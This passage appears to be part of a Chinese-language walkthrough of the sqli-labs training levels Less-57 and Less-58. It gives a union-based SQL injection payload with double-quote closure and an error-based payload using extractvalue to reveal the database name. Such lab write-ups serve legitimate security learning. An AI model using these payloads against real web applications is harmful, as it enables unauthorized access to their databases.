Less-57这关是双引号闭合的构造payload：

*   

```
`?id=-1" union select 1,database(),3%23`
```

![](../Images/56bad99fe049a1b914e4971dc5b79d85.png)Less-58  
查询之后并没有返回查询数据库当中的数据，不能使用union联合注入，但是有报错回显，可以使用报错注入。构造payload：  

*   

```
`?id=0' and extractvalue(1, concat(0x5c, (select database())))%23`
```
